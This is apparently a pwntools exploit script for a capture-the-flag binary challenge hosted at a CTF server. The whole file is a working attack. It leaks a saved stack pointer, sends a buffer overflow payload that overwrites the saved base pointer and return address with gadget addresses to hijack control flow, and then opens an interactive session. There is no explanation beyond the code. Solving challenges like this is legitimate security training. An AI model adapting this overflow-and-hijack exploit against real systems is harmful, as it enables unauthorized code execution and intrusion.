#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or 'chall')
context.terminal = ['wt.exe','wsl.exe']
context.log_level = 'debug'
def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOT:
        return remote('ctf.compfest.id',7004)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
break *0x401401
break *0x401478
continue
'''.format(**locals())
 
p = start()
name = b'A'*32
p.send(name)
p.recvuntil(b'A'*32)
leak = u64(p.recv(6).ljust(8,b'\x00')) - 0x40
print(f'saved rbp leak @ {hex(leak)}')

payload = b'A'*0x20
payload += p64(leak)
payload += p64(0x401473)
payload += b'C'*0x8
payload += p64(0x401016)
payload += p64(0x401206)
p.recvuntil(b'You do: ')
p.sendline(payload)
p.interactive()

